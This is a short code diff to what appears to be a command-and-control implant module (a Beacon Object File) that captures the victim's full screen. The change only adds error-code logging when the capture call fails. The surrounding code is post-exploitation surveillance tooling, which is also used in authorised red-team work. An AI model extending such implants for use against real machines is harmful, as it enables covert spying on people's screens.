@@ -737,8 +737,10 @@ void go(char* buff, int len)
             return;
         }
         HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
-        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
-            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture");
+	if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
+	    DWORD errorCode = GetLastError();
+	    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture. Error code: %lu", errorCode);
+	}
         pSelectObject(hDC, old_obj);
         pDeleteDC(hDC);
         pReleaseDC(NULL, hScreen);
